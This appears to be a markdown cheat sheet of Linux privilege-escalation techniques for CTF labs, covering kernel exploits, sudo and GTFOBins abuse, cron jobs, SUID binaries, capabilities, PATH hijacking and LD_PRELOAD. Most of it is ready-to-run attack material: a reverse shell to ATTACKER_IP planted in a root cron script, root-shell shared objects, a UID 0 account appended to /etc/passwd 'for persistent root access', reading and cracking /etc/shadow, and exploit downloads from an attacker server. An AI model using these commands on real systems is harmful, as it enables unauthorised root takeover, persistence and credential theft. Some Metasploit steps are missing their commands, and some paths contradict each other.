### ***Linux Privilege Escalation Examples***

<details>
<summary>Kernel Exploits</summary>
 <br> 
 Kernel Exploits
 ----------------------
Step 1: Identify & Search for Exploits
The first step is to identify potential exploits for the target system. You can use Searchsploit to find known vulnerabilities for the specific kernel version.
    
    cat /proc/version
    uname -a #will print the Kernel Version
    searchsploit linux 3.13.0-24
This will list exploits relevant to the kernel version. In this case, the target kernel version is 3.13.0-24.

To extract all the vulnerable kernel versions from that web you can do:

    curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
![image](https://github.com/user-attachments/assets/5629083f-a755-4c84-be78-db0c17a3e6fe)

Tools that could help searching for kernel exploits are:

[suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
[suggester2](https://github.com/jondonas/linux-exploit-suggester-2)
[linuxprivchecker](http://www.securitysift.com/download/linuxprivchecker.py)

Always search the kernel version in Google, maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.
Prerequisites

***Kernel Exploit using metasploit**

Target system must be Linux kernel 5.8 to 5.10.102 or 5.15.0 to 5.15.25 (vulnerable to Dirty Pipe).
You must have user-level access (shell or Meterpreter session) on the target.

Metasploit Framework is installed and running.
 Step-by-Step Exploitation Flow
Step 1: Gain Initial Access to Target
You can use any method to get a shell or Meterpreter session. For example:


If successful, this will give you a shell session.

Step 2: List Active Sessions

Example output:

Active sessions
===============

  Id  Name  Type            Information         Connection
  --  ----  ----            -----------         ----------
  1         shell linux     kali@target         192.168.0.123:4444 -> 192.168.0.121:5555
Step 3: Use the Dirty Pipe Exploit Module

Step 4: Set Required Options

You can also set the payload if needed:


Step 5: Run the Exploit

If successful, you’ll get a root-level Meterpreter session.

Step 6: Verify Privilege Escalation

Expected output:

Server username: root
 Troubleshooting Tips
If SESSION is not set, Metasploit will throw:
Msf::OptionValidateError One or more options failed to validate: SESSION.
Ensure the target is vulnerable to Dirty Pipe.
Use sysinfo or uname -r in the session to check kernel version.



***Locate the Exploit**

Once you’ve identified a suitable exploit, use the locate command to find its full path and inspect the code.

    locate linux/local/37292.c
    cat /usr/share/exploitdb/exploits/linux/local/37292.c
This shows the contents of the exploit file, which you'll need to compile and execute.
![image](https://github.com/user-attachments/assets/3647680d-156d-453a-9f3b-8adb43c9396f)

Step 3: Check for Compiler and Permissions
Before proceeding with the exploit, ensure the necessary tools and permissions are available on the target system.

Check for GCC: Ensure that the GCC compiler is installed.

    which gcc
Check File Permissions: Verify that you have write permissions to the directory where you’ll save the exploit.

    ls -la
 ![image](https://github.com/user-attachments/assets/22116cd7-9f80-4db0-b85c-2120955a17bc)

Step 4: Copy and Rename the Exploit
Next, copy the exploit code to your Downloads folder and rename it to something like ofs.c.

    sudo cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/kali/Downloads/
    mv 37292.c ofs.c
![image](https://github.com/user-attachments/assets/28fa1d5a-7532-42b9-bd10-1cfbabc9bcfa)

Step 5: Set Up an HTTP Server to Serve the Payload
On your attacker machine, start an HTTP server to serve the payload file (ofs.c) to the victim machine.

    updog -p 80
On the victim machine, use wget to download the exploit:

    wget http://10.6.42.239/ofs.c
![image](https://github.com/user-attachments/assets/b8dc99c8-d633-4f6c-a42c-8273b7f7e63f)

Step 6: Compile the Exploit
Now that the exploit is on the victim’s machine, compile the C code to create the binary that will escalate privileges.

    gcc ofs.c -o ofs
    ./ofs
Step 7: Verify Root Access
Once the exploit runs successfully, you should have root privileges. Verify by checking your user ID with whoami.

    whoami
You should see root, indicating that you’ve escalated to root privileges.
![image](https://github.com/user-attachments/assets/7729b24c-ccb3-49b2-af83-32e608213bcd)

Step 8: Locate the Flag
As a final step, search for the flag file on the system. You can use the following commands to locate and read the flag:

    find / -name flag1.txt 2>/dev/null
    cat /home/matt/flag1.txt
![image](https://github.com/user-attachments/assets/6fd0400a-4cff-4a01-a06d-1640757f4df3)

Summary
Privilege Escalation: This technique involves using kernel exploits to escalate user privileges.

Exploit Search: Use tools like Searchsploit to find relevant vulnerabilities for your target system.

Payload Delivery: Serve the payload using an HTTP server and download it on the target machine.

Compilation and Execution: Compile the C code and run it to gain root access.

Find and Read Flag: After gaining root privileges, locate the flag file to complete the task.


</details>

<details>
<summary>SUDO</summary>
 <br> 

Sudo Privileges
----------------------
Check Current Sudo Privileges
To check your current permissions related to sudo, you can use the following command:

    $ sudo -l
This will list the commands a user is allowed to run with sudo privileges. Based on this, an attacker may find a vulnerability to escalate privileges.
If a user has the ability to execute a command with sudo but doesn't have access to everything, we can search for payloads to leverage this.
search for payloads in https://gtfobins.github.io/

Exploit with Sudo
Assuming you can execute find with sudo, you can use the following command to spawn a shell with root privileges:

    sudo find . -exec /bin/sh \; -quit
![image](https://github.com/user-attachments/assets/1d174aff-f610-476e-bb4e-bb3d723280f9)

This command forces find to run a shell (/bin/sh) as root by using sudo. The -quit flag ensures that the find command stops executing immediately after spawning the shell.

Find Common Exploitable Binaries
Some binaries may be configured to allow root access when used with sudo. For example:

nano:
/usr/bin/nano is often a text editor installed on many Linux systems. If a user can run nano with root privileges, they can edit sensitive files, such as /etc/passwd.
![image](https://github.com/user-attachments/assets/e9e7c340-4896-4fe7-afec-00e1eb021b86)


less:
Similarly, less is a pager program, often used to view files. If improperly configured, it may allow privilege escalation:
![image](https://github.com/user-attachments/assets/ab8e392c-17f0-4c1e-be1d-61092cd8d27f)

Find the Flag
After successfully escalating privileges, you can search the system for the flag (or other sensitive files):

    find / -name flag.txt 2>/dev/null
Here, we look for a file called flag.txt and suppress any error messages.
![image](https://github.com/user-attachments/assets/d8883e72-a1a1-4fb4-bd40-dc2c3c781e46)

Find the Hash of Frank's Password
If the password file has been compromised or altered, you can often find hashes of user passwords, including Frank’s password:

      cat /etc/shadow | grep frank
Once you find the hash, you can try cracking it using tools like John the Ripper or Hashcat.
![image](https://github.com/user-attachments/assets/4ba1ec66-b320-40c7-8b8d-0d2d5fe25a1e)


Overwriting Files (Risky)

Warning: This command will overwrite important system files like /etc/passwd — don’t use this in production systems! This is useful only for Capture the Flag (CTF) scenarios or safe environments.

Here’s how you can potentially overwrite the /etc/passwd file to give yourself root access:
*** THIS WILL OVERWRITE THE PASSWD FILE, NOT A GOOD PRACTICE FOR CTF ***

    LFILE=/etc/passwd
    DATA='siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash\n'
    sudo find / -maxdepth 0 -fprintf "$LFILE" "$DATA"
Explanation:

This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line. could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.

Sudo version
Based on the vulnerable sudo versions that appear in:

    searchsploit sudo
You can check if the sudo version is vulnerable using this grep.

    sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

---
Abusing Intended Functionality
------------------------------


    $ sudo apache2 -f /etc/shadow
    Syntax error on line 1 of /etc/shadow:
    Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
---
Summary:

sudo Privileges: If a user has sudo access to certain commands (like find, nano, or less), they might be able to escalate their privileges.

Exploit via sudo: Using sudo find . -exec /bin/sh \; or exploiting misconfigurations with common binaries, an attacker could gain root access.

Overwriting Critical Files: Be cautious when overwriting system files like /etc/passwd — it’s risky but useful for CTFs.

Finding the Flag: Once you have root access, locate the flag and/or crack password hashes from /etc/shadow.
</details>

<details>
<summary>CORN JOB</summary>
 <br> 

Cron jobs
----------------------
Cron jobs are scheduled tasks that run scripts or binaries at specified times. By default, they execute with the privileges of their owner, not the user who triggers them. If a cron job is owned by root but writable by an unprivileged user, that user can inject code to run as root.

1. Understand Where Cron Jobs Live
System-wide crontab:
/etc/crontab — defines global scheduled tasks.

Per-user crontabs:
/var/spool/cron/crontabs/<username> — only editable by the respective user.

Cron directories (/etc/cron.hourly, /etc/cron.daily, etc.)

If PATH variable defined inside a crontab, and one of the paths is writable, and the cron job doesn't refer to an absolute path, we can exploit.


    $ cat /etc/crontab
    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    * * * * * root backup.sh
   ![image](https://github.com/user-attachments/assets/d30b6e0d-abcc-46ad-9898-cdc241acff03)


In the example above, /home/karen is in the PATH and our user can write to it.

Confirm What’s Running and When
You can observe cron in action using a tool like pspy on the target:

Transfer and run pspy to monitor cron executions
[PSPY](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)

    ./pspy64
You’ll see lines like:

[CRON] running /usr/local/bin/backup.sh

Inject Your Payload:

Create a /home/karen/backup.sh script which makes a SUID/SGID bit version of bash:
Since you have write access, append a reverse-shell or any root-shell payload:

Edit the script:

    nano /usr/local/bin/backup.sh
Append, for example, a simple bash reverse shell:

    # …existing backup commands…
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
Save and exit.
Check and make the script executable:

    $ chmod +x /home/karen/backup.sh

Now wait for the cron job to execute. When it does,Start a listener on your attacker machine:


    $ nc -lvnp 4444
    #
Wait up to one minute for cron to run the modified script.

You’ll receive a root shell connection.

Wildcards
---------

If the cron job script contains bash wildcards that reference files, and we can create files in the relevant directory, it may be possible to create files with filenames that can be used as command line flags.


    $ cat /etc/crontab
    ...
    * * * * * root /usr/local/bin/compress.sh


    $ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *

The tar executable has a checkpoint feature which displays progress messages every specific number of records. It also allows users to define an action that is executed during the checkpoint.

Create a script (runme.sh) which makes a SUID/SGID bit version of bash:


    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Make the script executable:


    $ chmod +x runme.sh

Create two files in the directory that the tar command is run in, with the filename set to the full command line options:


    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=sh\ runme.sh

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:


    $ /tmp/rootbash -p
    #

File Overwrite
--------------

If a cron job script is writable, we can modify it and run commands as root:


    $ cat /etc/crontab
    ...
    * * * * * root overwrite.sh


    $ locate overwrite.sh
    /usr/local/bin/overwrite.sh
    $ ls -l /usr/local/bin/overwrite.sh
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh

The /usr/local/bin/overwrite.sh file is world-writable.

Overwrite the /usr/local/bin/overwrite.sh script with one that makes a SUID/SGID bit version of bash:


    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:


    $ /tmp/rootbash -p
    #
</details>

<details>
<summary>File Permissions</summary>
 <br> 

Writable /etc/passwd Privilege Escalation

The /etc/passwd file on Unix-like systems contains essential information about user accounts, including the username, UID, GID, home directory, and default shell. If this file is writable by an unprivileged user, it presents a significant security vulnerability.

1. The passwd File Format
Each line in /etc/passwd represents a user account in the following format:

       username:password:UID:GID:GECOS:home_dir:shell

Exploiting a Writable /etc/passwd
If an attacker can modify /etc/passwd and add an entry for a new user with UID 0 (the root user ID), they can gain root access without needing a password.

Steps to Add a New Root User
Check if /etc/passwd is writable: Verify if you have write access to /etc/passwd:

    ls -l /etc/passwd
If you have write permissions, proceed.

Add a new root user: Use echo to append a new user to /etc/passwd with UID 0 (root user). This will make the new user a root user with no password.

    echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd
Explanation:

newroot is the username of the new account.

:: indicates no password.

0:0 are the UID and GID for root.

/root is the home directory (root's home).

/bin/bash is the default shell for this new user.

Switch to the new root user: Use su (switch user) to change to the newroot account:

    su newroot
You now have root privileges: After switching, you will have a root shell:

    # whoami
      root
Important Notes
No Password Needed: Since the new account has no password, the system won't prompt for one, and you can immediately log in as the new root user.

Permanent Access: The new root user will persist across reboots until /etc/passwd is modified again. This makes this method highly effective for establishing persistent root access.

</details>

<details>
<summary>SUID Binaries</summary>
 <br> 
Shared Object Injection
 ----------------------
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
^^^^^^^^^^^^^^^^^^^^^^^

Shared Objects (.so) are the \*nix equivalent of Windows DLLs. If a program references a shared object that we can write to (even if it doesn't exist) we can run commands with the user context of the application.

Find SUID/SGID binaries:

    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    or
    find / -type f -perm -04000 -ls 2>/dev/null
    or
    find / -perm -u=s -type f 2>/dev/null
    
These commands search the system for files with the SUID (04000) or SGID (02000) bits set and list them. Files with these special permission bits could potentially allow privilege escalation.

 ![image](https://github.com/user-attachments/assets/8886aea9-5c2f-47cf-adb5-361f174fde67)

A good practice would be to compare executables on this list with GTFOBins. Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a [pre-filtered list](https://gtfobins.github.io/#+suid).

Base64 configured with the SUID bit, can be leveraged for privilege escalation.
Decoding Base64-Encoded Files
You can sometimes encounter base64-encoded files like /etc/shadow or /etc/passwd, which contain encrypted or sensitive data. To decode these files, use the following commands:

Example for /etc/shadow:

    LFILE=/etc/shadow
    base64 "$LFILE" | base64 --decode
This will decode the base64-encoded contents of /etc/shadow.
![image](https://github.com/user-attachments/assets/a520482d-fa30-4ac5-876e-17b2c3c13bc7)

Example for /etc/passwd:

    LFILE=/etc/passwd
    base64 "$LFILE" | base64 --decode
This will decode the base64-encoded contents of /etc/passwd.

Cracking Password Hashes
After you have decoded sensitive files like /etc/shadow or /etc/passwd, you can extract password hashes and attempt to crack them.

Cracking /etc/shadow and /etc/passwd
Decode both files and copy them to your system. Then, run the following commands to prepare for password cracking:

    unshadow user2pass user2 > passwd.txt  # user2pass = /etc/passwd, user2 = /etc/shadow

Use John the Ripper to crack the password hashes with a wordlist:

    sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
This will attempt to crack the password hashes using the rockyou.txt wordlist.
![image](https://github.com/user-attachments/assets/fcef5969-8533-4831-818a-946f88f12ed3)

Directly flag can be achived using base64 ablites: 
Example for a specific file (e.g., flag3.txt):

      LFILE=home/ubuntu/flag3.txt
      base64 "$LFILE" | base64 --decode
This command decodes the contents of flag3.txt.
![image](https://github.com/user-attachments/assets/cc23f201-dde6-4043-9ac5-9580c5648988)

Use strace to find references to shared objects:

    $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

The shared object /home/user/.config/libcalc.so is referenced, but it doesn't exist. Luckily it is in a writable directory.

Create a C program (libcalc.c) and compile it to a shared object:


    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));
    void inject() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    $ gcc -shared -fPIC -o libcalc.so libcalc.c

Move the libcalc.so shared object to the path referenced by the SUID binary:


    $ mkdir -p /home/user/.config
    $ cp libcalc.so /home/user/.config/libcalc.so

Now run the SUID binary, it should give you a root shell immediately:


    $ suid-so
    Calculating something, please wait...
    root@debian:~# 

Symlink
^^^^^^^

TODO

Environment Variables - Relative Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:


    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:


    $ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start

The "service" command doesn't have an absolute path. When it is called, \*nix will try to find it by traversing the PATH environment variable. We can modify the PATH variable and create a malicious version of the service binary which will spawn a root shell when it is run.

First create a C program (service.c):


    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

Compile it to our malicious binary:


    $ gcc -o /tmp/service service.c

Add /tmp to the start of the PATH environment variable and export it:


    $ export PATH=/tmp:$PATH

Now run the original SUID/SGID binary. A root shell should spawn:


    $ /usr/local/bin/suid-env
    #

Environment Variables - Absolute Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:


    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:


    $ strings /usr/local/bin/suid-env2
    /lib64/ld-linux-x86-64.so.2
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    /usr/sbin/service apache2 start

The /usr/sbin/service command seems to be interesting, however it has an absolute path and cannot be edited.

Some versions of Bash (<4.2-048) and Dash let you define functions with the same name as an absolute path. These then take precedent above the actual executable themselves.

Define a bash function "/usr/sbin/service" that creates an SUID/SGID version of bash:


    $ function /usr/sbin/service() { cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p;}

Export the new function:


    $ export -f /usr/sbin/service

Now run the original SUID/SGID binary. A root shell should spawn:


    $ /usr/local/bin/suid-env2
    #

Bash also supports a script debugging mode, and uses the PS4 environment variable to define a prompt for the debugging mode.

We can get an instance root shell:


    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod +s /tmp/rootbash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/rootbash -p'
</details>
<details>
<summary>Capabilities</summary>
 <br> 
What Are Capabilities?
----------------------
In Unix-like systems, capabilities are used to provide more granular control over the privileges of processes or binaries, rather than granting full root access. This method allows administrators to assign specific privileges to processes that would typically require higher-level permissions.

For example:

A SOC analyst might need to run a tool that initiates socket connections, but they don't require full root access. By using capabilities, the administrator can grant just the necessary permission to that specific tool, rather than giving the analyst root privileges.

How Capabilities Work
Instead of giving a program full root privileges, a system administrator can set specific capabilities on a binary to allow it to perform certain actions that would otherwise require elevated privileges. For instance, a binary might be given the capability to bind to privileged ports or set user IDs without granting the user full root access.

You can check which capabilities are assigned to a binary or process using the getcap tool.

Checking Capabilities on a System
To list all the binaries with specific capabilities set on your system, use the following command:

getcap -r / 2>/dev/null
This command recursively checks all files starting from the root directory and lists those with capabilities set. The output might look something like this:

/usr/bin/vim = cap_setuid+ep
This means that the vim binary has the cap_setuid capability, which allows it to change its user ID (UID) to any value, including root (UID 0).

Example of Exploiting Capabilities for Privilege Escalation
Let's say the vim binary has been granted the cap_setuid capability. This capability allows vim to change the user ID of the current process. If we can use this capability to set the user ID to 0 (root), we can effectively escalate our privileges.

Check the Capabilities: We use the getcap tool to see that vim has the cap_setuid capability set.

getcap /usr/bin/vim
Output might be:

/usr/bin/vim = cap_setuid+ep
Escalate to Root Using vim: With the cap_setuid capability, we can craft a command that uses vim to escalate to root. The following command utilizes Python scripting inside vim to change the user ID to 0 (root) and then spawn a root shell:

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Breakdown of the Command:
:py3 import os: This imports the Python os module within vim.

os.setuid(0): This changes the user ID of the current process to 0, which is the root user.

os.execl("/bin/sh", "sh", "-c", "reset; exec sh"): This replaces the current process (which is vim) with a new shell (/bin/sh), and it spawns a root shell.

Result:
This command will execute the Python code inside vim, which changes the user ID to 0 (root) and opens a shell with root privileges. The result is a root shell.

After executing this, running whoami will show:

# whoami
root
You now have root access without needing to log in as the root user.

Conclusion
Capabilities offer a more granular control over process privileges by allowing specific permissions, such as changing user IDs or binding to privileged ports, to be granted to a binary.

If a binary like vim is configured with the cap_setuid capability, it can change its UID to root and escalate privileges.

Always ensure to audit and manage capabilities carefully to avoid inadvertent privilege escalation opportunities.

This method highlights the importance of reviewing and controlling which capabilities are granted to binaries on your system.
</details>
<details>
<summary>PATH Hijacking</summary>
 <br> 
 What is the PATH Environment Variable?
 ----------------------
In Linux, PATH is an environmental variable that tells the operating system where to look for executable files. When you run a command in the shell (such as ls, cat, or any custom script), Linux searches for that command in the directories listed in the PATH variable.

For example:

If a command is not built into the shell or if its absolute path is not specified, Linux will start searching for it in the directories defined under the PATH variable.

The PATH variable typically contains directories like /usr/bin, /bin, /usr/local/bin, etc., where most of the system binaries are stored.

How to Check the PATH?
You can check the current directories in your PATH by running:

echo $PATH
This will show a colon-separated list of directories, like this:

/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/games:/usr/games:/snap/bin
Exploiting Writable Folders in PATH
If a folder listed in PATH has write permissions for your user, you could potentially hijack an application by placing a malicious script or executable in that folder. This could trick the system into running your script instead of the legitimate binary when the application is called.

Writable Folders Search: To identify writable directories in the PATH, you can use the following command:

find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
This will search for writable folders under the /usr directory and display the results. Some of these directories may be part of the PATH and could be hijacked.

Example output might look like this:

/usr/local
/usr/bin
Hijacking a Command: If a writable folder is found in PATH, you can replace a system command with a malicious script. For example, you could create a script named thm in a writable directory like /tmp and hijack the thm command.

Example of Hijacking Using Writable Folders in PATH
Let’s consider the following example:

Check the Current PATH: We can check if /tmp is in the PATH by running:

echo $PATH
If /tmp is not in the PATH, we can add it. This is done using the following command:

export PATH=/tmp:$PATH
This command prepends /tmp to the beginning of the PATH, making it the first directory that the system will search for executables.

Creating a Malicious Script: Next, we can create a malicious executable in /tmp. In this case, we can copy the /bin/bash binary to /tmp and rename it to thm:

cp /bin/bash /tmp/thm
chmod +x /tmp/thm
Hijacking the Application: Now, if the system tries to run the thm command, it will search in /tmp first (because we added it to the PATH). Since we have placed our malicious thm script in /tmp, the system will execute our script instead of the legitimate one.

When the user runs the thm command, the system will execute the bash shell from /tmp, giving the attacker a shell with the same privileges as the user who ran the command.
</details>
<details>
<summary>Startup Scripts</summary>
 <br> 

Startup scripts are stored under /etc/init.d, and are usually run with elevated privileges.

Find world-writable startup scripts:


    $ find /etc/init.d -perm -o+w -type f -exec ls -l {} \; 2>/dev/null
    -rwxr-xrwx 1 root root 801 May 14  2017 /etc/init.d/rc.local

Edit the script and add some code that creates an SUID/SGID bash shell:


    cp /bin/bash /tmp/rootbash
    chown root:root /tmp/rootbash
    chmod +s /tmp/rootbash

Now restart the remote host, and once the host is restarted, spawn a root shell:


    $ /tmp/rootbash -p
    #
</details>
<details>
<summary>Configuration Files</summary>
 <br> 

Configuration files are usually stored in /etc.
----------------------
Check writable files to see if we can introduce misconfigurations (e.g. if /etc/exports is writable, we can define NFS shares with root squashing turned off).
</details>
</details>
<details>
<summary>LD_PRELOAD</summary>
 <br> 
Environment variables:

* LD_LIBRARY_PATH - A list of directories in which to search for RLF libraries at execution time.
* LD_PRELOAD - A list of additional, user-specified, ELF shared objects to be loaded before all others.

Sudo has the ability to preserve certain environment variables:


    $ sudo -l
    Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

Compile a shared object (.so) file:


    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c

Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.


    $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
    #
</details>
<details>
<summary>NFS</summary>
 <br> 

NFS allows a host to share file system resources over a network. Access Control is based on the server's file system, and on the uid/gid provided by the connecting client.

